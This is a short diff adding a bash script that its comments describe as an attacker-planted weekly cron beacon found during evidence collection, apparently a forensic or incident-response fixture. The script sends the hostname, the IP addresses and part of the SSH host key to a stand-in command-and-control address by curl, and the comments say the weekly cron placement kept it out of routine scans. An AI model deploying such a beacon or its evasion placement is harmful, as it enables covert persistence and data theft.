@@ -1,0 +1,9 @@
+#!/bin/bash
+# Installed by attacker 2025-10-18 ("svc_metrics" plant). Runs weekly.
+# Beacons to C2 with hostname + IP data. Has been running undetected
+# for ~6 months at evidence-collection time. Small footprint (weekly
+# cron, not /etc/cron.d/ which gets more attention) is what kept it
+# out of routine scans.
+curl -s -m 10 -X POST "https://203.0.113.99/telemetry" \
+    --data "h=$(hostname)&ip=$(hostname -I)&k=$(cat /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null | head -c 40)" \
+    -o /dev/null
